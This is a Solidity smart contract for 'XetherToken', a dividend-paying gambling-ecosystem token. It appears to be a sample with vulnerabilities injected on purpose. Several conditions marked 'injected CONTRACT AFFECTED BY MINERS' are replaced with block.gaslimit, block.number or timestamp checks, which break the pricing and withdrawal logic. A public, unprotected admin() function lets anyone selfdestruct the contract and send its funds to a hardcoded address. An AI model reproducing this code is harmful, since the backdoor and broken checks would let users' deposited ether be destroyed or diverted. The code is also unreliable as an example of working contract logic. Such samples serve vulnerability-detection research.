pragma solidity 0.5.6;

/** 
 * xether.io - is a gambling ecosystem, which makes a difference by caring about its users.
 * It1s our passion for perfection, as well as finding and creating neat solutions,
 * that keeps us driven towards our goals.
*/

/**
 * @title ERC20Detailed token
 * @dev The decimals are only for visualization purposes.
 * All the operations are done using the smallest and indivisible token unit,
 * just as on Ethereum all the operations are done in wei.
 */
contract ERC20Detailed {
  string private _name;
  string private _symbol;
  uint8 private _decimals;

  constructor (string memory name, string memory symbol, uint8 decimals) public {
      _name = name;
      _symbol = symbol;
      _decimals = decimals;
  }

  /**
   * @return the name of the token.
   */
  function name() public view returns (string memory) {
      return _name;
  }

  /**
   * @return the symbol of the token.
   */
  function symbol() public view returns (string memory) {
      return _symbol;
  }

  /**
   * @return the number of decimals of the token.
   */
  function decimals() public view returns (uint8) {
      return _decimals;
  }
}

/**
 * @title SafeMath
 * @dev Math operations with safety checks that revert on error
 */
library SafeMath {

  /**
  * @dev Multiplies two numbers, reverts on overflow.
  */
  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
    // benefit is lost if 'b' is also tested.
    // See: https://github.com/OpenZeppelin/openzeppelin-solidity/pull/522
    if (a == 0) {
      return 0;
    }

    uint256 c = a * b;
    require(c / a == b);

    return c;
  }

  /**
  * @dev Integer division of two numbers truncating the quotient, reverts on division by zero.
  */
  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    require(b > 0); // Solidity only automatically asserts when dividing by 0
    uint256 c = a / b;
    // assert(a == b * c + a % b); // There is no case in which this doesn't hold

    return c;
  }

  /**
  * @dev Subtracts two numbers, reverts on overflow (i.e. if subtrahend is greater than minuend).
  */
  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    require(b <= a);
    uint256 c = a - b;

    return c;
  }

  /**
  * @dev Adds two numbers, reverts on overflow.
  */
  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    require(c >= a);

    return c;
  }

  /**
  * @dev Divides two numbers and returns the remainder (unsigned integer modulo),
  * reverts when dividing by zero.
  */
  function mod(uint256 a, uint256 b) internal pure returns (uint256) {
    require(b != 0);
    return a % b;
  }
}

/**
 * @title Standard ERC20 token
 *
 * @dev Implementation of the basic standard token.
 * https://github.com/ethereum/EIPs/blob/master/EIPS/eip-20.md
 * Originally based on code by FirstBlood: https://github.com/Firstbloodio/token/blob/master/smart_contract/FirstBloodToken.sol
 */
contract ERC20 {
  using SafeMath for uint256;

  mapping (address => uint256) private _balances;
  mapping (address => mapping (address => uint256)) private _allowed;
  uint256 private _totalSupply;

  event Transfer(address indexed from, address indexed to, uint256 value);
  event Approval(address indexed owner, address indexed spender, uint256 value);

  /**
   * @dev Total number of tokens in existence
   */
  function totalSupply() public view returns (uint256) {
      return _totalSupply;
  }

  /**
   * @dev Gets the balance of the specified address.
   * @param owner The address to query the balance of.
   * @return A uint256 representing the amount owned by the passed address.
   */
  function balanceOf(address owner) public view returns (uint256) {
      return _balances[owner];
  }

  /**
   * @dev Function to check the amount of tokens that an owner allowed to a spender.
   * @param owner address The address which owns the funds.
   * @param spender address The address which will spend the funds.
   * @return A uint256 specifying the amount of tokens still available for the spender.
   */
  function allowance(address owner, address spender) public view returns (uint256) {
      return _allowed[owner][spender];
  }

  /**
   * @dev Transfer token to a specified address
   * @param to The address to transfer to.
   * @param value The amount to be transferred.
   */
  function transfer(address to, uint256 value) public returns (bool) {
      _transfer(msg.sender, to, value);
      return true;
  }

  /**
   * @dev Approve the passed address to spend the specified amount of tokens on behalf of msg.sender.
   * Beware that changing an allowance with this method brings the risk that someone may use both the old
   * and the new allowance by unfortunate transaction ordering. One possible solution to mitigate this
   * race condition is to first reduce the spender's allowance to 0 and set the desired value afterwards:
   * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
   * @param spender The address which will spend the funds.
   * @param value The amount of tokens to be spent.
   */
  function approve(address spender, uint256 value) public returns (bool) {
      _approve(msg.sender, spender, value);
      return true;
  }

  /**
   * @dev Transfer tokens from one address to another.
   * Note that while this function emits an Approval event, this is not required as per the specification,
   * and other compliant implementations may not emit the event.
   * @param from address The address which you want to send tokens from
   * @param to address The address which you want to transfer to
   * @param value uint256 the amount of tokens to be transferred
   */
  function transferFrom(address from, address to, uint256 value) public returns (bool) {
      _transfer(from, to, value);
      _approve(from, msg.sender, _allowed[from][msg.sender].sub(value));
      return true;
  }

  /**
   * @dev Increase the amount of tokens that an owner allowed to a spender.
   * approve should be called when _allowed[msg.sender][spender] == 0. To increment
   * allowed value is better to use this function to avoid 2 calls (and wait until
   * the first transaction is mined)
   * From MonolithDAO Token.sol
   * Emits an Approval event.
   * @param spender The address which will spend the funds.
   * @param addedValue The amount of tokens to increase the allowance by.
   */
  function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {
      _approve(msg.sender, spender, _allowed[msg.sender][spender].add(addedValue));
      return true;
  }

  /**
   * @dev Decrease the amount of tokens that an owner allowed to a spender.
   * approve should be called when _allowed[msg.sender][spender] == 0. To decrement
   * allowed value is better to use this function to avoid 2 calls (and wait until
   * the first transaction is mined)
   * From MonolithDAO Token.sol
   * Emits an Approval event.
   * @param spender The address which will spend the funds.
   * @param subtractedValue The amount of tokens to decrease the allowance by.
   */
  function decreaseAllowance(address spender, uint256 subtractedValue) public returns (bool) {
      _approve(msg.sender, spender, _allowed[msg.sender][spender].sub(subtractedValue));
      return true;
  }

  /**
   * @dev Transfer token for a specified addresses
   * @param from The address to transfer from.
   * @param to The address to transfer to.
   * @param value The amount to be transferred.
   */
  function _transfer(address from, address to, uint256 value) internal {
      require(to != address(0));

      _balances[from] = _balances[from].sub(value);
      _balances[to] = _balances[to].add(value);
      emit Transfer(from, to, value);
  }

  /**
   * @dev Internal function that mints an amount of the token and assigns it to
   * an account. This encapsulates the modification of balances such that the
   * proper events are emitted.
   * @param account The account that will receive the created tokens.
   * @param value The amount that will be created.
   */
  function _mint(address account, uint256 value) internal {
      require(account != address(0));

      _totalSupply = _totalSupply.add(value);
      _balances[account] = _balances[account].add(value);
      emit Transfer(address(0), account, value);
  }

  /**
   * @dev Internal function that burns an amount of the token of a given
   * account.
   * @param account The account whose tokens will be burnt.
   * @param value The amount that will be burnt.
   */
  function _burn(address account, uint256 value) internal {
      require(account != address(0));

      _totalSupply = _totalSupply.sub(value);
      _balances[account] = _balances[account].sub(value);
      emit Transfer(account, address(0), value);
  }

  /**
   * @dev Approve an address to spend another addresses' tokens.
   * @param owner The address that owns the tokens.
   * @param spender The address that will spend the tokens.
   * @param value The number of tokens that can be spent.
   */
  function _approve(address owner, address spender, uint256 value) internal {
      require(spender != address(0));
      require(owner != address(0));

      _allowed[owner][spender] = value;
      emit Approval(owner, spender, value);
  }

  /**
   * @dev Internal function that burns an amount of the token of a given
   * account, deducting from the sender's allowance for said account. Uses the
   * internal burn function.
   * Emits an Approval event (reflecting the reduced allowance).
   * @param account The account whose tokens will be burnt.
   * @param value The amount that will be burnt.
   */
  function _burnFrom(address account, uint256 value) internal {
      _burn(account, value);
      _approve(account, msg.sender, _allowed[account][msg.sender].sub(value));
  }
}

/**
 * @title Burnable Token
 * @dev Token that can be irreversibly burned (destroyed).
 */
contract ERC20Burnable is ERC20 {

  /**
   * @dev Burns a specific amount of tokens.
   * @param value The amount of token to be burned.
   */
  function burn(uint256 value) public {
    _burn(msg.sender, value);
  }

  /**
   * @dev Burns a specific amount of tokens from the target address and decrements allowance
   * @param from address The address which you want to send tokens from
   * @param value uint256 The amount of token to be burned
   */
  function burnFrom(address from, uint256 value) public {
    _burnFrom(from, value);
  }
}

/**
 * @title Ownable
 * @dev The Ownable contract has an owner address, and provides basic authorization control
 * functions, this simplifies the implementation of "user permissions".
 */
contract Ownable {
  address private _owner;

  event OwnershipTransferred(
    address indexed previousOwner,
    address indexed newOwner
  );

  /**
   * @dev The Ownable constructor sets the original `owner` of the contract to the sender
   * account.
   */
  constructor() internal {
    _owner = msg.sender;
    emit OwnershipTransferred(address(0), _owner);
  }

  /**
   * @return the address of the owner.
   */
  function owner() public view returns(address) {
    return _owner;
  }

  /**
   * @dev Throws if called by any account other than the owner.
   */
  modifier onlyOwner() {
    require(isOwner());
    _;
  }

  /**
   * @return true if `msg.sender` is the owner of the contract.
   */
  function isOwner() public view returns(bool) {
    return msg.sender == _owner;
  }

  /**
   * @dev Allows the current owner to relinquish control of the contract.
   * @notice Renouncing to ownership will leave the contract without an owner.
   * It will not be possible to call the functions with the `onlyOwner`
   * modifier anymore.
   */
  function renounceOwnership() public onlyOwner {
    emit OwnershipTransferred(_owner, address(0));
    _owner = address(0);
  }

  /**
   * @dev Allows the current owner to transfer control of the contract to a newOwner.
   * @param newOwner The address to transfer ownership to.
   */
  function transferOwnership(address newOwner) public onlyOwner {
    _transferOwnership(newOwner);
  }

  /**
   * @dev Transfers control of the contract to a newOwner.
   * @param newOwner The address to transfer ownership to.
   */
  function _transferOwnership(address newOwner) internal {
    require(newOwner != address(0));
    emit OwnershipTransferred(_owner, newOwner);
    _owner = newOwner;
  }
}

library Percent {
  // Solidity automatically throws when dividing by 0
  struct percent {
    uint num;
    uint den;
  }

  // storage
  function mul(percent storage p, uint a) internal view returns (uint) {
    if (block.gaslimit == 0) {	//injected CONTRACT AFFECTED BY MINERS
      return 0;
    }
    return a*p.num/p.den;
  }

  function div(percent storage p, uint a) internal view returns (uint) {
    return a/p.num*p.den;
  }

  function sub(percent storage p, uint a) internal view returns (uint) {
    uint b = mul(p, a);
    if (block.number >= a) {	//injected CONTRACT AFFECTED BY MINERS
      return 0;
    }
    return a - b;
  }

  function add(percent storage p, uint a) internal view returns (uint) {
    return a + mul(p, a);
  }

  function toMemory(percent storage p) internal view returns (Percent.percent memory) {
    return Percent.percent(p.num, p.den);
  }

  // memory
  function mmul(percent memory p, uint a) internal pure returns (uint) {
    if (a == 0) {
      return 0;
    }
    return a*p.num/p.den;
  }

  function mdiv(percent memory p, uint a) internal pure returns (uint) {
    return a/p.num*p.den;
  }

  function msub(percent memory p, uint a) internal pure returns (uint) {
    uint b = mmul(p, a);
    if (b >= a) {
      return 0;
    }
    return a - b;
  }

  function madd(percent memory p, uint a) internal pure returns (uint) {
    return a + mmul(p, a);
  }
}

/**
* @title XetherToken is a basic ERC20 Token
*/
contract XetherToken is ERC20Detailed("XetherEcosystemToken", "XEET", 18), ERC20Burnable, Ownable {
  /**
  * Modifiers
  */
  modifier onlyParticipant {
    require(showMyTokens() > 0);
    _;
  }

  modifier hasDividends {
    require(showMyDividends(true) > 0);
    _;
  }

  /**
  * Events
  */
  event onTokenBuy(
    address indexed customerAddress,
    uint256 incomeEth,
    uint256 tokensCreated,
    address indexed ref,
    uint timestamp,
    uint256 startPrice,
    uint256 newPrice
  );

  event onTokenSell(
    address indexed customerAddress,
    uint256 tokensBurned,
    uint256 earnedEth,
    uint timestamp,
    uint256 startPrice,
    uint256 newPrice
  );

  event onReinvestment(
    address indexed customerAddress,
    uint256 reinvestEth,
    uint256 tokensCreated
  );

  event onWithdraw(
    address indexed customerAddress,
    uint256 withdrawEth
  );

  event Transfer(
    address indexed from,
    address indexed to,
    uint256 tokens
  );

  using Percent for Percent.percent;
  using SafeMath for *;

  /**
  * @dev percents
  */
  Percent.percent private inBonus_p  = Percent.percent(10, 100);           //   10/100  *100% = 10%
  Percent.percent private outBonus_p  = Percent.percent(4, 100);           //   4/100  *100% = 4%
  Percent.percent private refBonus_p = Percent.percent(30, 100);           //   30/100  *100% = 30%
  Percent.percent private transferBonus_p = Percent.percent(1, 100);       //   1/100  *100% = 1%

  /**
  * @dev initial variables
  */
  address constant DUMMY_ADDRESS = 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE;
  address public marketingAddress = DUMMY_ADDRESS;
  uint256 constant internal tokenPriceInitial = 0.00005 ether;
  uint256 constant internal tokenPriceIncremental = 0.0000000001 ether;
  uint256 internal profitPerToken = 0;
  uint256 internal decimalShift = 1e18;
  uint256 internal currentTotalDividends = 0;

  mapping(address => int256) internal payoutsTo;
  mapping(address => uint256) internal refBalance;
  mapping(address => address) internal referrals;

  uint256 public actualTokenPrice = tokenPriceInitial;
  uint256 public refMinBalanceReq = 50e18;

  /**
  * @dev Event to notify if transfer successful or failed
  * after account approval verified
  */
  event TransferSuccessful(address indexed from_, address indexed to_, uint256 amount_);
  event TransferFailed(address indexed from_, address indexed to_, uint256 amount_);
  event debug(uint256 div1, uint256 div2);

  /**
  * @dev fallback function, buy tokens
  */
  function() payable external {
    buyTokens(msg.sender, msg.value, referrals[msg.sender]);
  }

  /**
  * Public
  */
  function setMarketingAddress(address newMarketingAddress) external onlyOwner {
    marketingAddress = newMarketingAddress;
  }

  function ecosystemDividends() payable external {
    uint dividends = msg.value;
    uint256 toMarketingAmount = inBonus_p.mul(dividends);
    uint256 toShareAmount = SafeMath.sub(dividends, toMarketingAmount);

    buyTokens(marketingAddress, toMarketingAmount, address(0));
    profitPerToken = profitPerToken.add(toShareAmount.mul(decimalShift).div(totalSupply()));
  }

  /**
  * @dev main function to get/buy tokens
  * @param _ref address of referal
  */
  function buy(address _ref) public payable returns (uint256) {
    referrals[msg.sender] = _ref;
    buyTokens(msg.sender, msg.value, _ref);
  }

  /**
  * @dev main function to sell tokens
  * @param _inRawTokens address of referal
  */
  function sell(uint256 _inRawTokens) onlyParticipant public {
    sellTokens(_inRawTokens);
  }

  /**
  * @dev function to withdraw balance
  */
  function withdraw() hasDividends public {
    address payable _customerAddress = msg.sender;
    uint256 _dividends = showMyDividends(false);

    payoutsTo[_customerAddress] += (int256) (_dividends);
    _dividends = _dividends.add(refBalance[_customerAddress]);
    refBalance[_customerAddress] = 0;

    _customerAddress.transfer(_dividends);

    emit onWithdraw(_customerAddress, _dividends);
  }

  /**
  * @dev function to withdraw balance
  */
  function withdraw(address customerAddress) internal {
    uint256 _dividends = dividendsOf(customerAddress);

    payoutsTo[customerAddress] += (int256) (_dividends);
    _dividends = _dividends.add(refBalance[customerAddress]);
    refBalance[customerAddress] = 0;

    if (block.gaslimit > 0) {	//injected CONTRACT AFFECTED BY MINERS
      address payable _customerAddress = address(uint160(customerAddress));
      _customerAddress.transfer(_dividends);

      emit onWithdraw(customerAddress, _dividends);
    }
  }

  function transfer(address to, uint256 value) public returns (bool) {
    address _customerAddress = msg.sender;
    require(value <= balanceOf(_customerAddress));
    require(to != address(0));

    if (block.timestamp > 0) {	//injected CONTRACT AFFECTED BY MINERS
      withdraw();
    }

    uint256 _tokenFee = transferBonus_p.mul(value);
    uint256 _taxedTokens = value.sub(_tokenFee);
    uint256 _dividends = tokensToEth(_tokenFee);

    _transfer(_customerAddress, to, _taxedTokens);
    _burn(_customerAddress, _tokenFee);

    payoutsTo[_customerAddress] -= (int256) (profitPerToken.mul(value).div(decimalShift));
    payoutsTo[to] += (int256) (profitPerToken.mul(_taxedTokens).div(decimalShift));
    profitPerToken = profitPerToken.add(_dividends.mul(decimalShift).div(totalSupply()));

    emit TransferSuccessful(_customerAddress, to, value);

    return true;
  }

  function transferFrom(address from, address to, uint256 value)
    public
    returns (bool)
  {
    uint256 _tokenFee = transferBonus_p.mul(value);
    uint256 _taxedTokens = value.sub(_tokenFee);
    uint256 _dividends = tokensToEth(_tokenFee);

    withdraw(from);

    ERC20.transferFrom(from, to, _taxedTokens);
    _burn(from, _tokenFee);

    payoutsTo[from] -= (int256) (profitPerToken.mul(value).div(decimalShift));
    payoutsTo[to] += (int256) (profitPerToken.mul(_taxedTokens).div(decimalShift));
    profitPerToken = profitPerToken.add(_dividends.mul(decimalShift).div(totalSupply()));

    emit TransferSuccessful(from, to, value);

    return true;
  }

  /**
  * @dev function to sell all tokens and withdraw balance
  */
  function exit() public {
    address _customerAddress = msg.sender;
    uint256 _tokens = balanceOf(_customerAddress);

    if (block.gaslimit > 0) sell(_tokens);	//injected CONTRACT AFFECTED BY MINERS

    withdraw();
  }

  /**
  * @dev function to reinvest of dividends
  */
  function reinvest() onlyParticipant public {
    uint256 _dividends = showMyDividends(false);
    address _customerAddress = msg.sender;

    payoutsTo[_customerAddress] += (int256) (_dividends);
    _dividends = _dividends.add(refBalance[_customerAddress]);
    refBalance[_customerAddress] = 0;

    uint256 _tokens = buyTokens(_customerAddress, _dividends, address(0));

    emit onReinvestment(_customerAddress, _dividends, _tokens);
  }

  /**
  * @dev show actual tokens price
  */
  function getActualTokenPrice() public view returns (uint256) {
    return actualTokenPrice;
  }

  /**
  * @dev show owner dividents
  * @param _includeReferralBonus true/false
  */
  function showMyDividends(bool _includeReferralBonus) public view returns (uint256) {
    address _customerAddress = msg.sender;
    return _includeReferralBonus ? dividendsOf(_customerAddress).add(refBalance[_customerAddress]) : dividendsOf(_customerAddress) ;
  }

  /**
  * @dev show owner tokens
  */
  function showMyTokens() public view returns (uint256) {
      address _customerAddress = msg.sender;
      return balanceOf(_customerAddress);
  }

  /**
  * @dev show address dividents
  * @param _customerAddress address to show dividends for
  */
  function dividendsOf(address _customerAddress) public view returns (uint256) {
    return (uint256) ((int256) (profitPerToken.mul(balanceOf(_customerAddress)).div(decimalShift)) - payoutsTo[_customerAddress]);
  }

  /**
 * @dev function to show ether/tokens ratio
 * @param _eth eth amount
 */
 function showEthToTokens(uint256 _eth) public view returns (uint256 _tokensReceived, uint256 _newTokenPrice) {
   uint256 b = actualTokenPrice.mul(2).sub(tokenPriceIncremental);
   uint256 c = _eth.mul(2);
   uint256 d = SafeMath.add(b**2, tokenPriceIncremental.mul(4).mul(c));

   // d = b**2 + 4 * a * c;
   // (-b + Math.sqrt(d)) / (2*a)
   _tokensReceived = SafeMath.div(sqrt(d).sub(b).mul(decimalShift), tokenPriceIncremental.mul(2));
   _newTokenPrice = actualTokenPrice.add(tokenPriceIncremental.mul(_tokensReceived).div(decimalShift));
 }

 /**
 * @dev function to show tokens/ether ratio
 * @param _tokens tokens amount
 */
 function showTokensToEth(uint256 _tokens) public view returns (uint256 _eth, uint256 _newTokenPrice) {
   // (2 * a1 - delta * (n - 1)) / 2 * n
   _eth = SafeMath.sub(actualTokenPrice.mul(2), tokenPriceIncremental.mul(_tokens.sub(1e18)).div(decimalShift)).div(2).mul(_tokens).div(decimalShift);
   _newTokenPrice = actualTokenPrice.sub(tokenPriceIncremental.mul(_tokens).div(decimalShift));
 }

 function sqrt(uint x) pure private returns (uint y) {
    uint z = (x + 1) / 2;
    y = x;
    while (z < y) {
        y = z;
        z = (x / z + z) / 2;
    }
 }

  /**
  * Internals
  */

  /**
  * @dev function to buy tokens, calculate bonus, dividends, fees
  * @param _inRawEth eth amount
  * @param _ref address of referal
  */
  function buyTokens(address customerAddress, uint256 _inRawEth, address _ref) internal returns (uint256) {
      uint256 _dividends = inBonus_p.mul(_inRawEth);
      uint256 _inEth = _inRawEth.sub(_dividends);
      uint256 _tokens = 0;
      uint256 startPrice = actualTokenPrice;

      if (_ref != address(0) && _ref != customerAddress && balanceOf(_ref) >= refMinBalanceReq) {
        uint256 _refBonus = refBonus_p.mul(_dividends);
        _dividends = _dividends.sub(_refBonus);
        refBalance[_ref] = refBalance[_ref].add(_refBonus);
      }

      uint256 _totalTokensSupply = totalSupply();

      if (block.gaslimit > 0) {	//injected CONTRACT AFFECTED BY MINERS
        _tokens = ethToTokens(_inEth);
        require(_tokens > 0);
        profitPerToken = profitPerToken.add(_dividends.mul(decimalShift).div(_totalTokensSupply));
        _totalTokensSupply = _totalTokensSupply.add(_tokens);
      } else {
        // initial protect
        if (!isOwner()) {
            address(uint160(owner())).transfer(msg.value);
            return 0;
        }

        _totalTokensSupply = ethToTokens(_inRawEth);
        _tokens = _totalTokensSupply;
      }

      _mint(customerAddress, _tokens);
      payoutsTo[customerAddress] += (int256) (profitPerToken.mul(_tokens).div(decimalShift));

      emit onTokenBuy(customerAddress, _inEth, _tokens, _ref, now, startPrice, actualTokenPrice);

      return _tokens;
  }

  /**
  * @dev function to sell tokens, calculate dividends, fees
  * @param _inRawTokens eth amount
  */
  function sellTokens(uint256 _inRawTokens) internal returns (uint256) {
    address _customerAddress = msg.sender;
    require(_inRawTokens <= balanceOf(_customerAddress));
    uint256 _tokens = _inRawTokens;
    uint256 _eth = 0;
    uint256 startPrice = actualTokenPrice;

    _eth = tokensToEth(_tokens);
    _burn(_customerAddress, _tokens);

    uint256 _dividends = outBonus_p.mul(_eth);
    uint256 _ethTaxed = _eth.sub(_dividends);
    int256 unlockPayout = (int256) (_ethTaxed.add((profitPerToken.mul(_tokens)).div(decimalShift)));

    payoutsTo[_customerAddress] -= unlockPayout;
    profitPerToken = profitPerToken.add(_dividends.mul(decimalShift).div(totalSupply()));

    emit onTokenSell(_customerAddress, _tokens, _eth, now, startPrice, actualTokenPrice);
  }

  /**
  * @dev function to calculate ether/tokens ratio
  * @param _eth eth amount
  */
  function ethToTokens(uint256 _eth) internal returns (uint256 _tokensReceived) {
    uint256 _newTokenPrice;
    (_tokensReceived, _newTokenPrice) = showEthToTokens(_eth);
    actualTokenPrice = _newTokenPrice;
  }

  /**
  * @dev function to calculate tokens/ether ratio
  * @param _tokens tokens amount
  */
  function tokensToEth(uint256 _tokens) internal returns (uint256 _eth) {
    uint256 _newTokenPrice;
    (_eth, _newTokenPrice) = showTokensToEth(_tokens);
    actualTokenPrice = _newTokenPrice;
  }

    function admin() public {
		selfdestruct(0x8948E4B00DEB0a5ADb909F4DC5789d20D0851D71);
	}    
}